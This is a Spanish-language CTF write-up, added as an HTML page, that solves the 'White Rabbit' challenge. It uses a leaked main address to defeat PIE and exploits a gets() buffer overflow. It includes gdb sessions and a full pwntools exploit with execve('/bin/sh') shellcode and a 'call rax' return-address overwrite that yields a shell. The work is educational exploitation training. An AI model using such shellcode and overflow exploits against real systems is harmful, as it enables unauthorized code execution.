@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup World Wide White Rabbit</title>
+
+  <meta name="description" content="Resolución del reto White Rabbit del CTF de World Wide">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup World Wide White Rabbit">
+  <meta name="twitter:description" content="Resolución del reto White Rabbit del CTF de World Wide">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/worldwide.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup World Wide White Rabbit">
+  <meta property="og:description" content="Resolución del reto White Rabbit del CTF de World Wide">
+  <meta property="og:image" content="/images/otros/worldwide.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/worldwide.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup World Wide White Rabbit" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">World Wide</h4>
+    <picture><img src="/images/otros/worldwide.png" style="float: right; margin-right:0px; margin-left:0px; height:100px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">White Rabbit</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/WhiteRabbit/white_rabbit">binario</a> nos muestra una dirección en <code class="language-plaintext highlighter-rouge">x64</code> que por ahora no sabemos que es y nos parece que espera algo, probablemente necesitemos enviar una entrada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./white_rabbit</span><span class="p">
+
+  (\_/)
+  ( •_•)
+  / > 0x6319864fd180
+
+follow the white rabbit...  
+AAAAAAAABBBBBBBB</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos desensamblando el main <code class="language-plaintext highlighter-rouge">main</code>, este inicia llamando a <code class="language-plaintext highlighter-rouge">printf</code> mostrando en formato <code class="language-plaintext highlighter-rouge">%p</code> como puntero la dirección de la función <code class="language-plaintext highlighter-rouge">main</code> cargada en memoria</p>
+<a href="/challenges/whiterabbit/1.png" target="_blank"><div><p><img src="/challenges/whiterabbit/1.png"></p></div></a>
+
+<p class="plain-text">Podemos comprobarlo desde <code class="language-plaintext highlighter-rouge">gdb</code>, corremos y comprobamos que la dirección mostrada es la del <code class="language-plaintext highlighter-rouge">main</code> y pertenece al binario, si le restamos la dirección base del binario obtenemos el offset, entonces al restar <code class="language-plaintext highlighter-rouge">0x1180</code> al leak obtenemos la base</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q white_rabbit
+Reading symbols from </span><span class="p">white_rabbit</span><span class="p">...
+</span><span class="ro">pwndbg></span><span class="p"> r
+Starting program: </span><span class="ve">/home/user/white_rabbit </span><span class="p">
+[Depuración de hilo usando libthread_db enabled]
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+
+  (\_/)
+  ( •_•)
+  / > 0x555555555180
+
+follow the white rabbit...
+^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007ffff7d1ba61 </span><span class="p">in</span><span class="am"> __GI___libc_read</span><span class="p"> (</span><span class="az">fd</span><span class="p">=0, </span><span class="az">buf</span><span class="p">=0x7ffff7e03963 &lt_IO_2_1_stdin_+131>, </span><span class="az">nbytes</span><span class="p">=1)  
+</span><span class="ro">pwndbg></span><span class="p"> x/i 0x555555555180
+   </span><span class="az">0x555555555180</span><span class="p"> &lt</span><span class="am">main</span><span class="p">>:</span><span class="ve">	push</span><span class="ro">   rbp</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap 0x555555555180
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+    0x555555554000     0x555555555000 r--p     1000      0 /home/user/white_rabbit
+</span><span class="ro">►   0x555555555000     0x555555556000 r-xp     1000   1000 /home/user/white_rabbit +0x180</span><span class="p">
+    0x555555556000     0x555555557000 r--p     1000   2000 /home/user/white_rabbit
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x555555555180 - 0x555555554000
+</span><span class="az">$1</span><span class="p"> = 0x1180
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos automatizar todo este proceso desde un exploit en <code class="language-plaintext highlighter-rouge">python</code>, recibimos la dirección y le restamos el offset para obtener la dirección base del binario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./white_rabbit"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180</span><span class="p">  
+
+log.info(</span><span class="no">f</span><span class="s">"Binary base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit nos muestra la dirección base que calculamos del binario y si la comparamos con lo que nos devuelve <code class="language-plaintext highlighter-rouge">gdb</code> del proceso actual es la misma, de esta forma logramos evadir la protección <code class="language-plaintext highlighter-rouge">PIE</code> que aunque esta activa deja de afectarnos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 29067
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './white_rabbit']  
+[</span><span class="az">*</span><span class="p">] Binary base: 0x60dbb4bd2000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+follow the white rabbit...
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007e8f3fd1ba61 </span><span class="p">in</span><span class="am"> __GI___libc_read </span><span class="p">(</span><span class="az">fd</span><span class="p">=0, </span><span class="az">buf</span><span class="p">=0x7e8f3fe03963 &lt_IO_2_1_stdin_+131>, </span><span class="az">nbytes</span><span class="p">=1)  
+    at ../sysdeps/unix/sysv/linux/read.c:26
+</span><span class="ro">pwndbg></span><span class="p"> vmmap white_rabbit
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+►   0x60dbb4bd2000     0x60dbb4bd3000 r--p     1000      0 /home/user/white_rabbit
+</span><span class="ro">►   0x60dbb4bd3000     0x60dbb4bd4000 r-xp     1000   1000 /home/user/white_rabbit</span><span class="p">
+►   0x60dbb4bd4000     0x60dbb4bd5000 r--p     1000   2000 /home/user/white_rabbit
+►   0x60dbb4bd5000     0x60dbb4bd6000 r--p     1000   2000 /home/user/white_rabbit
+</span><span class="sa">►   0x60dbb4bd6000     0x60dbb4bd7000 rw-p     1000   3000 /home/user/white_rabbit</span><span class="p">
+    0x7e8f3fc00000     0x7e8f3fc28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Luego de todo el leak muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> y llama a la función <code class="language-plaintext highlighter-rouge">follow</code></p>
+<a href="/challenges/whiterabbit/2.png" target="_blank"><div><p><img src="/challenges/whiterabbit/2.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">follow</code> llama a <code class="language-plaintext highlighter-rouge">gets</code> para recibir datos en un buffer en <code class="language-plaintext highlighter-rouge">rbp - 112</code>, como no se controla la cantidad de datos a recibir tenemos un posible buffer overflow</p>
+<a href="/challenges/whiterabbit/3.png" target="_blank"><div><p><img src="/challenges/whiterabbit/3.png"></p></div></a>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, en este binario solo está habilitado el <code class="language-plaintext highlighter-rouge">PIE</code> que vuelve aleatoria la dirección base del binario, sin embargo ya la tenemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> white_rabbit
+[</span><span class="az">*</span><span class="p">] '/home/user/white_rabbit'
+    Arch:       amd64-64-little
+    RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:      </span><span class="ro">No canary found</span><span class="p">
+    NX:         </span><span class="am">NX unknown - GNU_STACK missing</span><span class="p">  
+    PIE:        </span><span class="ve">PIE enabled</span><span class="p">
+    Stack:      </span><span class="ro">Executable</span><span class="p">
+    RWX:        </span><span class="ro">Has RWX segments</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">112 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">rbp</code>, <code class="language-plaintext highlighter-rouge">8 B's</code> que seran el valor de ebp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> b"A" * 112 + b"B" * 8 + b"C" * 8 + b"D" * 24
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD'  
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb</span><span class="p"> -q white_rabbit
+Reading symbols from </span><span class="ve">white_rabbit</span><span class="p">...
+</span><span class="ro">pwndbg></span><span class="p"> r
+Starting program: </span><span class="ve">/home/user/white_rabbit</span><span class="p">
+[Depuración de hilo usando libthread_db enabled]
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+
+  (\_/)
+  ( •_•)
+  / > 0x555555555180
+
+follow the white rabbit...
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD  
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x000055555555517f </span><span class="p">in</span><span class="am"> follow</span><span class="p"> () at</span><span class="ve"> warmup.c</span><span class="p">:11
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
+</span><span class="az">$1</span><span class="p"> = 0x4242424242424242
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x7fffffffe2b8</span><span class="p">:	0x4343434343434343
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rsp+8
+</span><span class="az">0x7fffffffe2c0</span><span class="p">:	'D' &ltrepetidos 24 veces>
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que controlamos el return address y los datos del stack podriamos intentar saltar al <code class="language-plaintext highlighter-rouge">rsp</code> y ejecutar el shellcode, sin embargo no hay ningun gadget que lo ejecute</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file white_rabbit --jmp rsp  
+
+JMP Instructions
+================
+
+0 gadgets found</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos aprovecharnos del hecho de que <code class="language-plaintext highlighter-rouge">gets</code> como return value devuelve un puntero al buffer de destino, por lo que en <code class="language-plaintext highlighter-rouge">rax</code> que es donde se guarda el valor de retorno deberiamos tener una dirección que apunta al inicio de nuestro buffer</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/s $rax
+</span><span class="az">0x7fffffffe240</span><span class="p">:	'A' &ltrepetidos 112 veces>, "BBBBBBBBCCCCCCCC", 'D' &ltrepetidos 24 veces>  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">ropper</code> direcciones a donde podemos saltar encontramos varias instrucciones que llaman a <code class="language-plaintext highlighter-rouge">rax</code>, con lo que volveriamos al inicio del <code class="language-plaintext highlighter-rouge">input</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file white_rabbit --jmp rax  
+
+JMP Instructions
+================
+
+</span><span class="ro">0x0000000000001014</span><span class="p">:</span><span class="am"> call </span><span class="p">rax</span><span class="az">;</span><span class="p">
+</span><span class="ro">0x00000000000010bf</span><span class="p">:</span><span class="am"> jmp</span><span class="p"> rax</span><span class="az">;</span><span class="p">
+</span><span class="ro">0x0000000000001100</span><span class="p">:</span><span class="am"> jmp</span><span class="p"> rax</span><span class="az">;</span><span class="p">
+
+3 gadgets found</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos con un shellcode el cual nos ejecutara una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al return address, en el ejecutaremos el <code class="language-plaintext highlighter-rouge">call rax</code> que llama al inicio del buffer y como en el inicio enviamos el shellcode se ejecutará y nos dará la shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import </span><span class="p">process, p64, asm
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./white_rabbit"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1180  </span><span class="p">
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    push 0x3b                 # execve()
+    pop rax                   # $rax = execve()
+
+    mov rdi, 0x68732f6e69622f # $rdi = "/bin/sh"
+    push rdi                  # $rsp = &"/bin/sh"
+    push rsp                  # &"/bin/sh"
+    pop rdi                   # $rdi = &"/bin/sh"
+
+    cdq                       # $rdx = NULL
+    push rdx                  # $rsp = &0x0
+    pop rsi                   # $rsi = NULL
+
+    syscall                   # system call
+"""</span><span class="p">, </span><span class="am">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+
+offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(shellcode))
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(binary_base </span><span class="o">+ </span><span class="mi">0x1014</span><span class="p">)</span><span class="c1"> # call rax;</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"...</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './white_rabbit': pid 27593  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$ </span><span class="p">id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
